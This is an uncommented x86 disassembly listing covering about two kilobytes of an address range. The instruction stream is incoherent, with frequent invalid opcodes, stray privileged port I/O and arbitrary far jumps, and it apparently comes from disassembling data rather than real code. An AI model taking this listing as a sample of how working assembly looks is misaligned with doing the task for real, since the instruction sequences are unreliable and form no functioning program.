  416e30:	and    edx,DWORD PTR [ebx+0x59]
  416e33:	mov    esp,0x23f073d8
  416e38:	fisttp DWORD PTR [edi+0x42]
  416e3b:	popf   
  416e3c:	jp     0x416e6e
  416e3e:	pop    esp
  416e3f:	sbb    al,0x29
  416e41:	aad    0x6
  416e43:	stos   DWORD PTR es:[edi],eax
  416e44:	pop    es
  416e45:	add    DWORD PTR [edi+0x7d],esp
  416e48:	mov    eax,0x171f1985
  416e4d:	pop    esi
  416e4e:	or     DWORD PTR [ebp-0x24],eax
  416e51:	imul   edx,DWORD PTR [ecx],0xc08b194c
  416e57:	iret   
  416e58:	retf   
  416e59:	call   0x50813fd1
  416e5e:	in     al,dx
  416e5f:	mov    edi,0xba7b7a90
  416e64:	mov    ah,0x96
  416e66:	pop    ecx
  416e67:	gs ins DWORD PTR es:[di],dx
  416e6a:	xchg   BYTE PTR [esi+0x5c],bl
  416e6d:	jge    0x416ebc
  416e6f:	xor    ecx,DWORD PTR [ebx]
  416e71:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e73:	adc    dl,BYTE PTR [ebx+0x48149ffb]
  416e79:	sub    al,0x55
  416e7b:	mov    cs,eax
  416e7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e7e:	mov    dl,BYTE PTR [ebx+0x5740c2c8]
  416e84:	dec    ebx
  416e85:	fild   QWORD PTR [edx+0x4b6adefa]
  416e8b:	into   
  416e8c:	jge    0x416e85
  416e8e:	lahf   
  416e8f:	jmp    0x5b90081e
  416e94:	or     eax,0x3b652fc2
  416e99:	xor    eax,0xc26eabac
  416e9e:	aad    0x1b
  416ea0:	rcl    DWORD PTR ds:0xa6563635,0xb2
  416ea7:	into   
  416ea8:	loopne 0x416e57
  416eaa:	jns    0x416ea1
  416eac:	inc    ebp
  416ead:	out    0x24,eax
  416eaf:	or     esi,DWORD PTR [bp+si+0x1b]
  416eb3:	fist   WORD PTR [esi-0x154696c6]
  416eb9:	add    BYTE PTR [edi-0x75],cl
  416ebc:	xor    bh,ch
  416ebe:	and    al,0x90
  416ec0:	mov    cl,0xc0
  416ec2:	ds push ss
  416ec4:	dec    edi
  416ec6:	out    dx,eax
  416ec7:	pop    edx
  416ec8:	or     BYTE PTR [ebx],bh
  416eca:	dec    esi
  416ecb:	or     edi,DWORD PTR [esi+ecx*2+0x1721b3f2]
  416ed2:	in     eax,dx
  416ed3:	rcl    edi,cl
  416ed5:	xor    al,0xe3
  416ed7:	fisub  DWORD PTR [edi]
  416ed9:	sbb    ch,dl
  416edb:	add    DWORD PTR [eax+0x2a],edx
  416ede:	pop    ecx
  416edf:	adc    al,0x7f
  416ee1:	and    DWORD PTR [ebx+0xa1717a0],esp
  416ee7:	fwait
  416ee8:	mov    dh,0xf9
  416eea:	cmp    ch,bh
  416eec:	xor    BYTE PTR ds:[esp+eax*8+0x38],dh
  416ef1:	jecxz  0x416e9f
  416ef3:	and    DWORD PTR [esi-0x620f502d],ebp
  416ef9:	mov    ecx,0x4c4cf8a5
  416efe:	aaa    
  416eff:	and    ebp,edi
  416f01:	add    DWORD PTR [edx+0x3],0x122b6e77
  416f08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f09:	and    cl,BYTE PTR [ecx-0x2f250521]
  416f0f:	push   eax
  416f10:	mov    bh,0x5e
  416f12:	outs   dx,DWORD PTR ds:[esi]
  416f13:	mov    bl,BYTE PTR [edx+edi*2]
  416f16:	jmp    0x416f65
  416f18:	ret    
  416f19:	(bad)  
  416f1a:	pusha  
  416f1b:	mov    ah,0xb6
  416f1d:	fisubr WORD PTR [esi-0x60]
  416f20:	xchg   ebx,eax
  416f21:	scas   eax,DWORD PTR es:[edi]
  416f22:	shl    DWORD PTR [edi+0x27],cl
  416f25:	adc    edx,DWORD PTR ds:0x2bf535b6
  416f2b:	bound  esi,QWORD PTR ds:0x4d96e0b
  416f31:	xchg   al,al
  416f33:	loop   0x416f74
  416f35:	sbb    BYTE PTR [eax-0x1d3e374f],ch
  416f3b:	jmp    0x416f04
  416f3d:	mov    ds:0xec8eadaf,al
  416f42:	mov    eax,ds:0x754c07d9
  416f47:	sbb    DWORD PTR [edi+edx*4],esi
  416f4a:	mov    esp,0x1fe11ea
  416f4f:	jmp    0x3e84:0x6a5207dc
  416f56:	sub    DWORD PTR [ecx+edi*8+0x17],edx
  416f5a:	(bad)  
  416f5b:	loope  0x416ee7
  416f5d:	sbb    BYTE PTR [ecx+0x43fd00af],ch
  416f63:	(bad)  
  416f64:	in     eax,0x4e
  416f66:	call   0x17bff47d
  416f6b:	mov    edx,0xb7b3c7e6
  416f70:	and    DWORD PTR [edi],edx
  416f72:	(bad)  
  416f73:	call   FWORD PTR [ebp+0x40]
  416f76:	fst    QWORD PTR [esi]
  416f78:	iret   
  416f79:	(bad)  
  416f7b:	add    bh,al
  416f7d:	daa    
  416f7e:	jae    0x416fa5
  416f80:	inc    ebx
  416f81:	(bad)  
  416f83:	ret    0x8847
  416f86:	popf   
  416f87:	mov    ecx,0x6ddd7fda
  416f8c:	in     al,0xa2
  416f8e:	or     esp,DWORD PTR [ebx]
  416f90:	(bad)  
  416f91:	jnp    0x416f35
  416f93:	dec    ecx
  416f94:	lahf   
  416f95:	or     esp,DWORD PTR ds:0x6e681521
  416f9b:	int    0x20
  416f9d:	out    0x69,al
  416f9f:	test   DWORD PTR [ecx],esi
  416fa1:	pop    esi
  416fa2:	pushf  
  416fa3:	xor    DWORD PTR [ecx],ecx
  416fa5:	jno    0x41701e
  416fa7:	aam    0xda
  416fa9:	lods   al,BYTE PTR ds:[esi]
  416faa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fab:	pop    ebp
  416fac:	imul   edi,DWORD PTR [eax-0x19],0xfbbc5b45
  416fb3:	mov    dl,0xd
  416fb5:	bound  ebp,QWORD PTR [eax]
  416fb7:	add    eax,0x1dc066ab
  416fbc:	mov    edi,0xe1b12af7
  416fc1:	sbb    esp,DWORD PTR [edx-0x1fec7765]
  416fc7:	test   bl,ah
  416fc9:	loope  0x417035
  416fcb:	adc    eax,DWORD PTR [edi+eax*2+0x21f71c0e]
  416fd2:	(bad)  
  416fd3:	(bad)  
  416fd4:	(bad)  
  416fd5:	push   esp
  416fd6:	lds    edx,FWORD PTR [edx-0x4fb067e3]
  416fdc:	loopne 0x416ff7
  416fde:	cwde   
  416fdf:	(bad)  
  416fe0:	(bad)  
  416fe1:	ficom  DWORD PTR [edi]
  416fe3:	(bad)  
  416fe4:	clc    
  416fe5:	comiss xmm6,DWORD PTR cs:[eax]
  416fe9:	mov    eax,gs:0x89a3915f
  416fef:	adc    DWORD PTR [ecx+0x7f45a475],esp
  416ff5:	pop    ss
  416ff6:	(bad)  
  416ff7:	fist   DWORD PTR [edi]
  416ff9:	mov    ebp,0x97484828
  416ffe:	ror    eax,cl
  417000:	jnp    0x41705e
  417002:	imul   esi,DWORD PTR [esi+0x7e9a665d],0xfffffffb
  417009:	das    
  41700a:	shl    DWORD PTR ds:0x60ec9209,0x26
  417011:	mov    ebx,esp
  417013:	xchg   ebp,eax
  417014:	xchg   edi,eax
  417015:	mov    BYTE PTR [eax],bl
  417017:	cmp    eax,DWORD PTR [edi+eiz*4]
  41701a:	jo     0x416fda
  41701c:	imul   ebx,DWORD PTR [eax+0x2f],0x10
  417020:	jmp    0x9e57:0xf2b2a895
  417027:	sbb    eax,eax
  417029:	rcr    DWORD PTR [ebx+0x51ce1b82],cl
  41702f:	xor    al,0x54
  417031:	inc    edi
  417032:	loope  0x416fbd
  417034:	jl     0x41708a
  417036:	sub    eax,DWORD PTR ds:0xba9f4349
  41703c:	arpl   dx,dx
  41703e:	dec    ebx
  41703f:	xlat   BYTE PTR ds:[ebx]
  417040:	add    ebx,DWORD PTR [edx+0x27]
  417043:	or     DWORD PTR [edi],edx
  417045:	lahf   
  417046:	pop    es
  417047:	mov    eax,0x324212f4
  41704c:	and    dh,BYTE PTR [eax-0x4a5e5cca]
  417052:	call   0xe2555501
  417057:	jne    0x41704f
  417059:	mov    esi,edx
  41705b:	push   0x556297ca
  417060:	cmp    al,0x9
  417062:	cmp    eax,ebx
  417064:	scas   eax,DWORD PTR es:[edi]
  417065:	cli    
  417066:	sbb    BYTE PTR [ecx-0x27],bh
  417069:	cmp    eax,0xe4ae9554
  41706e:	and    DWORD PTR [edx],esi
  417070:	mov    esp,0x35fde9c7
  417075:	out    dx,eax
  417076:	dec    ebx
  417077:	xor    esi,DWORD PTR [ecx+0x38]
  41707a:	add    eax,0xbb22a1be
  41707f:	enter  0xa9fb,0xc7
  417083:	enter  0x2d61,0x2b
  417087:	je     0x417045
  417089:	fld    DWORD PTR [ecx+0x34de3bd6]
  41708f:	mov    esp,0x562c6736
  417094:	outs   dx,DWORD PTR ds:[esi]
  417095:	popf   
  417096:	mov    edx,0xc88af731
  41709b:	fsub   QWORD PTR [esi]
  41709d:	sahf   
  41709e:	leave  
  41709f:	iret   
  4170a0:	or     al,0x13
  4170a2:	pop    esp
  4170a3:	mov    ds:0x9b39d0c7,al
  4170a8:	pcmpeqb mm2,QWORD PTR [eax+ebp*8-0x4e19e5e7]
  4170b0:	cs pop ecx
  4170b2:	nop
  4170b3:	add    dl,BYTE PTR [edi+0x23]
  4170b6:	mov    ds:0x6446d228,eax
  4170bb:	fld    QWORD PTR [eax+edx*8+0xa]
  4170bf:	inc    ebx
  4170c0:	imul   BYTE PTR [ecx+edi*8]
  4170c3:	loope  0x41707f
  4170c5:	and    eax,0xa38b9680
  4170ca:	pop    esi
  4170cb:	in     eax,dx
  4170cc:	add    dh,BYTE PTR gs:[edi+edx*4]
  4170d0:	retf   0xa381
  4170d3:	sbb    bh,BYTE PTR [esi-0x32]
  4170d6:	inc    edx
  4170d7:	push   edx
  4170d8:	aaa    
  4170d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170da:	xchg   DWORD PTR [ebx-0x33],ebp
  4170dd:	cmp    eax,0x113531e7
  4170e2:	dec    eax
  4170e3:	xchg   esp,eax
  4170e4:	sub    DWORD PTR [edx-0x559176a9],edi
  4170ea:	ret    0x10cb
  4170ed:	daa    
  4170ee:	jbe    0x4170c3
  4170f0:	jp     0x417119
  4170f2:	cld    
  4170f3:	dec    esp
  4170f4:	call   0xf329:0x6ca4d145
  4170fb:	push   ebp
  4170fc:	sub    BYTE PTR [ebx-0x1b5dd8e8],0x78
  417103:	push   ecx
  417104:	fs push esp
  417106:	jno    0x4170b1
  417108:	sub    ebx,DWORD PTR [edi+0x34632807]
  41710e:	jb     0x4170fe
  417110:	das    
  417111:	call   0x7ab3:0x4a1371ff
  417118:	ja     0x417132
  41711a:	bnd jae 0x4170ee
  41711d:	add    al,0x81
  41711f:	test   al,0x96
  417121:	hlt    
  417122:	lods   eax,DWORD PTR ds:[esi]
  417123:	xor    BYTE PTR [ebp-0x51c91f43],ah
  417129:	mov    eax,0x95130ae8
  41712e:	xchg   DWORD PTR [ebx],esi
  417130:	loopne 0x4170d1
  417132:	pop    ecx
  417133:	mov    ebp,0x659dea95
  417138:	mov    cl,BYTE PTR [eax]
  41713a:	ret    0xe955
  41713d:	(bad)  
  41713e:	leave  
  41713f:	int3   
  417140:	int3   
  417141:	jns    0x41712a
  417143:	pop    ebx
  417144:	pop    edx
  417145:	push   cs
  417146:	stc    
  417147:	cmc    
  417148:	push   ds
  417149:	or     eax,0x745b752c
  41714e:	push   ds
  41714f:	sbb    DWORD PTR [edx],esi
  417151:	sub    DWORD PTR [ebp+0x6829f102],ebx
  417157:	or     al,0x66
  417159:	mov    ah,0x6e
  41715b:	adc    edi,DWORD PTR [esi+0x77a5244d]
  417161:	std    
  417162:	pop    ecx
  417163:	scas   al,BYTE PTR es:[edi]
  417164:	xchg   edx,eax
  417165:	or     ah,dh
  417167:	out    0xc8,al
  417169:	mov    BYTE PTR [eax-0x2c3d046c],cl
  41716f:	mov    al,ds:0x330c00b6
  417174:	push   cs
  417175:	fdiv   DWORD PTR [ecx+0xf]
  417178:	dec    edx
  417179:	mov    ds:0xc6dadde1,al
  41717e:	mov    eax,0x52cf9daf
  417183:	enter  0x8bd6,0x5a
  417187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417188:	mov    edx,0x566de5b4
  41718d:	ret    
  41718e:	in     eax,dx
  41718f:	mov    edi,0xe4a55c23
  417194:	aaa    
  417195:	dec    esp
  417196:	pop    edi
  417197:	sbb    al,0x9a
  417199:	and    ebp,0x67
  41719c:	rol    DWORD PTR [edx-0x59],1
  41719f:	mov    ebp,0x4dcfb7bf
  4171a4:	(bad)  [ebp-0x44]
  4171a7:	js     0x417208
  4171a9:	ds mov ecx,0x105ea2f2
  4171af:	adc    edx,DWORD PTR [edi-0x3d993f3d]
  4171b5:	iret   
  4171b6:	or     bh,bl
  4171b8:	icebp  
  4171b9:	in     al,0x75
  4171bb:	repz push ss
  4171bd:	outs   dx,BYTE PTR ds:[esi]
  4171be:	cmp    BYTE PTR [ecx],0x53
  4171c1:	mov    cl,0x6c
  4171c3:	xor    DWORD PTR [ecx],ecx
  4171c5:	xchg   ecx,eax
  4171c6:	int3   
  4171c7:	shl    al,1
  4171c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171ca:	mov    edi,edi
  4171cc:	pop    edi
  4171cd:	dec    eax
  4171ce:	shl    BYTE PTR [ecx],0x5b
  4171d1:	jg     0x4171b1
  4171d3:	dec    edx
  4171d4:	stos   DWORD PTR es:[edi],eax
  4171d5:	clc    
  4171d6:	faddp  st(1),st
  4171d8:	push   cs
  4171d9:	cmp    bl,bl
  4171db:	inc    esp
  4171dc:	push   eax
  4171dd:	jmp    0xd820:0xb9c902ec
  4171e4:	pop    esi
  4171e5:	sar    BYTE PTR [bp+si],cl
  4171e8:	sub    ebp,eax
  4171ea:	inc    esi
  4171eb:	add    dh,dh
  4171ed:	adc    eax,0x6e48ae92
  4171f2:	pop    ebp
  4171f3:	mov    eax,ds:0xa27ced2c
  4171f8:	jae    0x41724b
  4171fa:	dec    edi
  4171fb:	or     al,0xd7
  4171fd:	push   ss
  4171fe:	das    
  4171ff:	leave  
  417200:	in     eax,dx
  417201:	arpl   WORD PTR [edx+0x32],bx
  417204:	cdq    
  417205:	mov    ?,WORD PTR [edi+0x73c16686]
  41720b:	retf   0x67ca
  41720e:	add    eax,0xb6ef7855
  417213:	rol    DWORD PTR fs:[edi],0xae
  417217:	ja     0x417221
  417219:	clc    
  41721a:	test   al,0x6c
  41721c:	cmc    
  41721d:	icebp  
  41721e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41721f:	xchg   edx,eax
  417220:	rol    dl,cl
  417222:	stos   DWORD PTR es:[edi],eax
  417223:	scas   al,BYTE PTR es:[edi]
  417224:	in     al,0x7e
  417226:	fstp   TBYTE PTR [ebx+0x26948f96]
  41722c:	xchg   ebp,eax
  41722d:	loope  0x4171cd
  41722f:	jl     0x4171e1
  417231:	les    esi,FWORD PTR [edx]
  417233:	sub    al,0x6
  417235:	aaa    
  417236:	xchg   ecx,eax
  417237:	clc    
  417238:	mov    ah,ah
  41723a:	add    al,0xd8
  41723c:	test   DWORD PTR [eax],0xa404e2ae
  417242:	and    ch,BYTE PTR [ecx+0x48]
  417245:	mov    esp,0x8de50c96
  41724a:	mov    ds:0xcbda7d46,eax
  41724f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417250:	xor    DWORD PTR ds:0xe3666a93,0x5580c7ab
  41725a:	push   esi
  41725b:	xlat   BYTE PTR ds:[ebx]
  41725c:	mov    ah,0x74
  41725e:	js     0x4171e7
  417260:	xor    edi,DWORD PTR [ebx]
  417262:	ins    DWORD PTR es:[edi],dx
  417263:	and    BYTE PTR [ecx+eax*1-0xc],al
  417267:	leave  
  417268:	pop    ebx
  417269:	repz cmp ebx,ecx
  41726c:	lods   eax,DWORD PTR ds:[esi]
  41726d:	cld    
  41726e:	dec    ebp
  41726f:	adc    al,0xe7
  417271:	int3   
  417272:	inc    esi
  417273:	mov    edi,0xfb87403a
  417278:	daa    
  417279:	xchg   ebx,eax
  41727a:	pop    di
  41727c:	int3   
  41727d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41727e:	xor    dh,bl
  417280:	fcomp  DWORD PTR [edx-0x4d]
  417283:	loope  0x417299
  417285:	or     bh,BYTE PTR [esi]
  417287:	xor    eax,0xebc452db
  41728c:	and    bl,BYTE PTR [ecx]
  41728e:	fwait
  41728f:	mov    ch,0x82
  417291:	imul   ebp,DWORD PTR ds:0x8ebdd142,0xffffff93
  417298:	dec    DWORD PTR [ebx-0xbfe2f01]
  41729e:	sbb    DWORD PTR [eax+0x58e35115],esi
  4172a4:	add    eax,ebx
  4172a6:	ja     0x4172c5
  4172a8:	repnz mov dh,0x74
  4172ab:	sub    bl,BYTE PTR [edi-0x617a3cf5]
  4172b1:	out    0xae,al
  4172b3:	(bad)  
  4172b5:	retf   0x9cce
  4172b8:	dec    ecx
  4172b9:	sub    esp,DWORD PTR [esp+eax*8+0x1]
  4172bd:	and    al,0x27
  4172bf:	xchg   edi,eax
  4172c0:	int3   
  4172c1:	outs   dx,DWORD PTR ds:[esi]
  4172c2:	out    dx,eax
  4172c3:	inc    esp
  4172c4:	rcr    DWORD PTR [esi-0x1a],cl
  4172c7:	call   0x9cc63fd9
  4172cc:	div    BYTE PTR [eax]
  4172ce:	arpl   WORD PTR [ebp-0x86df1c2],bx
  4172d4:	inc    eax
  4172d5:	aas    
  4172d6:	bound  ebx,QWORD PTR [ecx+0x7c1082b4]
  4172dc:	shr    dl,cl
  4172de:	fcmovu st,st(0)
  4172e0:	cmp    al,0xee
  4172e2:	js     0x417280
  4172e4:	sti    
  4172e5:	out    dx,eax
  4172e6:	out    dx,al
  4172e7:	push   esi
  4172e8:	out    dx,eax
  4172e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172ea:	retf   
  4172eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172ec:	inc    edx
  4172ed:	lods   al,BYTE PTR ds:[esi]
  4172ee:	sbb    bl,BYTE PTR [ebx+ecx*8-0x7f]
  4172f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172f3:	cmp    ecx,DWORD PTR [edx-0x61]
  4172f6:	jmp    0xe6d2:0x9cfcd0d
  4172fd:	mov    cs,WORD PTR [edi+0x64]
  417300:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417301:	retf   
  417302:	or     eax,0x6e3180fd
  417307:	inc    ebp
  417308:	and    esi,edx
  41730a:	idiv   ecx
  41730c:	xlat   BYTE PTR ss:[ebx]
  41730e:	ret    
  41730f:	cwde   
  417310:	lock repz ret 0x29eb
  417315:	mov    BYTE PTR [eax],bh
  417317:	in     eax,0x4b
  417319:	push   edi
  41731a:	std    
  41731b:	sub    cl,ah
  41731d:	ja     0x417304
  41731f:	mov    bh,0xc1
  417321:	rcr    BYTE PTR [ecx+0x3a56c81a],0x52
  417328:	jno    0x417338
  41732a:	inc    esp
  41732b:	(bad)  
  41732c:	ja     0x4172fc
  41732e:	not    BYTE PTR [edi]
  417330:	jl     0x417365
  417332:	push   ecx
  417333:	imul   ebx,DWORD PTR [edi],0xc3d8c60c
  417339:	push   esi
  41733a:	sbb    DWORD PTR [ebp+0x4bbc7754],edi
  417340:	loope  0x4173a3
  417342:	(bad)  
  417343:	enter  0x2b48,0x6d
  417347:	test   al,0x0
  417349:	push   ds
  41734a:	pusha  
  41734b:	dec    ebx
  41734c:	in     al,dx
  41734d:	mov    ds:0xfeb222f,eax
  417352:	aad    0xb
  417354:	cmp    cl,bl
  417356:	sub    BYTE PTR [esi+0x15f3b1f8],bl
  41735c:	pusha  
  41735d:	jns    0x41733e
  41735f:	dec    edx
  417360:	ret    
  417361:	mov    ah,ch
  417363:	mov    bh,0xe7
  417365:	test   BYTE PTR [ebp+0x4e],dl
  417368:	in     eax,0x46
  41736a:	loopne 0x41733a
  41736c:	fst    QWORD PTR [eax+0x6bf30577]
  417372:	adc    DWORD PTR [edx+0x5fd526f4],0xd6b24ac2
  41737c:	std    
  41737d:	or     al,BYTE PTR [ebx-0x6c895a7]
  417383:	mov    al,ds:0xa604f4b7
  417388:	pop    ebx
  417389:	cmp    ecx,0xf997f927
  41738f:	jae    0x4173a2
  417391:	push   ecx
  417392:	loop   0x417348
  417394:	shl    edx,0xf7
  417397:	std    
  417398:	in     al,0xe8
  41739a:	jle    0x417332
  41739c:	stc    
  41739d:	push   esi
  41739e:	add    eax,0x7a2ff3d8
  4173a3:	pop    ebp
  4173a4:	sub    edi,DWORD PTR [ecx+edx*4+0xf]
  4173a8:	mov    bl,0xeb
  4173aa:	fsub   QWORD PTR [eax-0x3825081c]
  4173b0:	test   BYTE PTR [ebx],bh
  4173b2:	call   0xb59:0x7e933a0a
  4173b9:	xor    ch,BYTE PTR [edi-0x2a]
  4173bc:	cmp    eax,0x1cd16462
  4173c1:	mov    edx,DWORD PTR ds:0xa5311eff
  4173c7:	loope  0x4173e5
  4173c9:	adc    eax,0x83606453
  4173ce:	(bad)  
  4173d0:	or     bh,BYTE PTR [edi-0x60]
  4173d3:	mov    edx,0x2785730c
  4173d8:	in     al,0x1b
  4173da:	add    bh,BYTE PTR [edx]
  4173dc:	mov    al,0x7
  4173de:	or     esi,DWORD PTR [edx+eax*1-0x59]
  4173e2:	lahf   
  4173e3:	dec    edx
  4173e4:	xchg   esp,edi
  4173e6:	adc    cl,bh
  4173e8:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4173ea:	or     bl,dh
  4173ec:	mov    ebp,0x3b5ccfc2
  4173f1:	sbb    al,BYTE PTR [ebp+0x2748ae1d]
  4173f7:	(bad)  [ecx-0x1476d4c3]
  4173fd:	cmp    al,0x21
  4173ff:	in     eax,dx
  417400:	call   0x63c8:0x2926b7d8
  417407:	sub    DWORD PTR [ebx-0x8],ebp
  41740a:	cld    
  41740b:	xchg   ecx,eax
  41740c:	neg    BYTE PTR [edi+0x47add766]
  417412:	xchg   edx,eax
  417413:	test   ch,ah
  417415:	imul   ecx,DWORD PTR [ebp+0x2c],0x228516ce
  41741c:	sar    BYTE PTR ds:0x56f47131,cl
  417422:	lock int3 
  417424:	adc    al,0x52
  417426:	retf   
  417427:	xlat   BYTE PTR ds:[ebx]
  417428:	pop    edx
  417429:	mov    ecx,DWORD PTR ds:0xf1221fa9
  41742f:	lahf   
  417430:	(bad)  
  417431:	cmp    BYTE PTR [edx+0x2f],bh
  417434:	add    al,0xf8
  417436:	add    DWORD PTR [esi+ecx*4],ebp
  417439:	(bad)  [ecx+0x3e]
  41743c:	leave  
  41743d:	lods   al,BYTE PTR ds:[esi]
  41743e:	sar    DWORD PTR [ecx-0x7],cl
  417441:	dec    ebp
  417442:	inc    ebp
  417443:	jne    0x4173d9
  417445:	loope  0x417486
  417447:	rol    ebp,1
  417449:	mov    WORD PTR [esi],fs
  41744b:	lea    edi,[edx]
  41744d:	dec    ebp
  41744e:	fidiv  DWORD PTR [esi]
  417450:	je     0x417439
  417452:	or     BYTE PTR [edx],bh
  417454:	sbb    ebx,DWORD PTR [esi+0x7a]
  417457:	cmc    
  417458:	js     0x4174b3
  41745a:	dec    edx
  41745b:	call   0x9fa8:0xe2d4cfa9
  417462:	push   0xf2fba1be
  417467:	(bad)  
  417468:	icebp  
  417469:	mov    ecx,0xd7dde148
  41746e:	test   cl,0x52
  417471:	mov    ds:0x4c8d7e5f,al
  417476:	cmc    
  417477:	stos   BYTE PTR es:[edi],al
  417478:	mov    WORD PTR [edx+0x65],ds
  41747b:	jmp    0x417499
  41747d:	sar    dl,1
  41747f:	dec    eax
  417480:	push   es
  417481:	mov    dh,0x5f
  417483:	rcl    DWORD PTR [esi-0x2a],0x3d
  417487:	jae    0x417412
  417489:	or     ah,bl
  41748b:	in     al,0x12
  41748d:	cmp    BYTE PTR ds:0x5c7747d2,ch
  417493:	test   BYTE PTR [ebp-0x7c],0x55
  417497:	push   eax
  417498:	repnz out dx,al
  41749a:	and    al,0x49
  41749c:	mov    ch,0x7e
  41749e:	jl     0x4174a2
  4174a0:	sbb    DWORD PTR [ecx-0x2d],0xffffff9e
  4174a4:	lahf   
  4174a5:	lds    ebx,FWORD PTR [edx]
  4174a7:	dec    esp
  4174a8:	push   eax
  4174a9:	mov    ebp,0x52f4f6e4
  4174ae:	(bad)  
  4174b0:	sbb    BYTE PTR [ecx],0x13
  4174b3:	and    BYTE PTR [eax-0x3341045b],cl
  4174b9:	call   0x76c4e98d
  4174be:	test   eax,0x49a9521a
  4174c3:	mov    edx,0x8f5ffd70
  4174c8:	pop    DWORD PTR [esi+0x1341ee39]
  4174ce:	mov    ecx,0xaf54ec44
  4174d3:	mov    fs,esp
  4174d5:	out    dx,al
  4174d6:	loope  0x41750b
  4174d8:	xchg   edx,eax
  4174d9:	stos   WORD PTR es:[edi],ax
  4174db:	fbld   TBYTE PTR [edi+ebp*1]
  4174de:	loop   0x417555
  4174e0:	jmp    0x417536
  4174e2:	xlat   BYTE PTR ds:[ebx]
  4174e3:	inc    esi
  4174e4:	adc    BYTE PTR [ebp*4+0x52d141c4],bl
  4174eb:	inc    edi
  4174ec:	test   al,0x3e
  4174ee:	and    DWORD PTR [eax],esp
  4174f0:	fs adc esp,edx
  4174f3:	dec    edx
  4174f4:	and    al,0x7a
  4174f6:	pop    ds
  4174f7:	push   edi
  4174f8:	jl     0x417492
  4174fa:	or     BYTE PTR [edi],dh
  4174fc:	xor    ah,BYTE PTR [esi+0x37]
  4174ff:	fisubr DWORD PTR [edx+0x7]
  417502:	ss dec ecx
  417504:	iret   
  417505:	lods   eax,DWORD PTR fs:[esi]
  417507:	sbb    ah,BYTE PTR [ecx-0x57d140b5]
  41750d:	test   al,0x2e
  41750f:	xchg   esp,eax
  417510:	xor    al,0x55
  417512:	and    eax,0xad30d7fe
  417517:	mov    eax,ds:0x6ffbea7c
  41751c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41751d:	mov    eax,DWORD PTR [esi+ebp*2-0x71]
  417521:	and    edx,eax
  417523:	sti    
  417524:	mov    eax,ds:0x6b8918a3
  417529:	out    dx,al
  41752a:	add    BYTE PTR es:[edi+0x749f210f],0xf3
  417532:	push   0x4
  417534:	add    bl,BYTE PTR [eax]
  417536:	push   0x5734d03b
  41753b:	mov    edi,0x709e341c
  417540:	fcomp  DWORD PTR [eax+0x65]
  417543:	imul   ecx,DWORD PTR [ebp+ecx*2-0x21],0xb2beef3c
  41754b:	repz mov ch,ch
  41754e:	fs jmp 0xaf7bab43
  417554:	aam    0x12
  417556:	mov    ebx,0x6d70cbb
  41755b:	cmc    
  41755c:	push   ss
  41755d:	ficomp DWORD PTR [ebx+edx*4]
  417560:	pushf  
  417561:	push   ebx
  417562:	ja     0x4175b0
  417564:	sub    ebp,DWORD PTR [ebp+0x4f]
  417567:	and    BYTE PTR [eax+0x3d],0x8f
  41756b:	fimul  WORD PTR [edi]
  41756d:	adc    cl,BYTE PTR [ecx-0x14]
  417570:	jae    0x4175f0
  417572:	dec    ecx
  417573:	aam    0x71
  417575:	sbb    DWORD PTR [edx-0x74e97df6],ebp
  41757b:	pop    es
  41757c:	sar    DWORD PTR [edx-0x6a],1
  41757f:	mov    ds:0xa26c03a4,eax
  417584:	cmp    BYTE PTR [ebx+eax*4-0x67],0xed
  417589:	(bad)  
  41758a:	ds push edi
  41758c:	adc    ebx,DWORD PTR [esi-0x1862de27]
  417592:	in     al,0x9c
  417594:	push   ds
  417595:	mov    eax,0xbc82516a
  41759a:	icebp  
  41759b:	pushf  
  41759c:	fmul   QWORD PTR [esi-0x34]
  41759f:	lods   al,BYTE PTR ds:[esi]
  4175a0:	(bad)  
  4175a1:	sub    eax,0x6657db30
  4175a6:	push   edi
  4175a7:	nop
  4175a8:	push   ecx
  4175a9:	sbb    al,0xd9
  4175ab:	arpl   WORD PTR [esi+ebp*2+0x67],bx
  4175af:	lahf   
  4175b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175b1:	pop    ebx
  4175b2:	imul   esi,edi,0xffffff8f
  4175b5:	scas   eax,DWORD PTR es:[edi]
  4175b6:	adc    eax,0x5d0c0b3b
  4175bb:	mov    BYTE PTR [eax-0x55],dl
  4175be:	mov    edi,0x8b50d8b3
  4175c3:	in     al,0x31
  4175c5:	cld    
  4175c6:	clc    
  4175c7:	cs mov ebp,0x21912c7b
  4175cd:	jnp    0x4175c6
  4175cf:	addr16 push esp
  4175d1:	push   0x10084758
  4175d6:	test   BYTE PTR [ebp-0x434651fc],dl
  4175dc:	jnp    0x417635
  4175de:	popa   
  4175df:	adc    al,0x9a
  4175e1:	dec    ecx
  4175e2:	scas   eax,DWORD PTR es:[edi]
  4175e3:	dec    esp
  4175e5:	mov    ch,0x52
  4175e7:	popa   
  4175e8:	and    ebp,DWORD PTR [edx+0x1fecf4d0]
  4175ee:	leave  
  4175ef:	add    al,0xd9
  4175f1:	dec    eax
  4175f2:	push   edx
  4175f3:	(bad)  
  4175f4:	out    dx,al
  4175f5:	mov    cl,0xbe
  4175f7:	jge    0x41759f
  4175f9:	cmp    al,0x32
  4175fb:	and    al,cl
  4175fd:	dec    ebp
  4175fe:	sti    
  4175ff:	add    al,0xae
  417601:	mov    al,ds:0x4d0daa3d
  417606:	xchg   ebx,eax
  417607:	ins    DWORD PTR es:[edi],dx
  417608:	push   es
  417609:	and    DWORD PTR [edx+0x67],esi
  41760c:	xchg   esi,eax
  41760d:	out    dx,al
  41760e:	(bad)  
  41760f:	test   BYTE PTR [edi-0x7d39b0c7],0x73
